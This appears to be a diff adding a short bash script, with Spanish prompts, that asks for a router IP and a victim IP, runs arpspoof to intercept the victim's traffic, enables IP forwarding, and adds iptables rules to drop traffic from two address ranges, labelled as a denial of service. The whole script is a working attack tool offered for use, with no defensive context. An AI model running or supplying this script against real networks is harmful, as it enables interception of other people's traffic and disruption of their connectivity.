@@ -1,0 +1,15 @@
+#!/bin/bash
+echo -e "Ingresar IP Router(GT):"
+read iprouter
+echo -e "Ingresar IP Victima:"
+read victima
+xterm -geometry 75x15+1+300 -T "Inicia ataque ARP Spoof" -e arpspoof -i wlan0 -t $victima $iprouter & 
+echo -e "\e[1;34mARP Spoof - Iniciado\e[0m"
+echo "1" > /proc/sys/net/ipv4/ip_forward
+sleep 2
+iptables -A INPUT -s 54.72.0.0/13 -j DROP
+iptables -A INPUT -s 54.80.0.0/12 -j DROP
+sleep 10
+echo -e "\e[1;34DENEGACION DE SERVICIO ACTIVADA\e[0m"
+iptables -A OUTPUT -s 54.72.0.0/13 -j DROP
+iptables -A OUTPUT -s 54.80.0.0/12 -j DROP
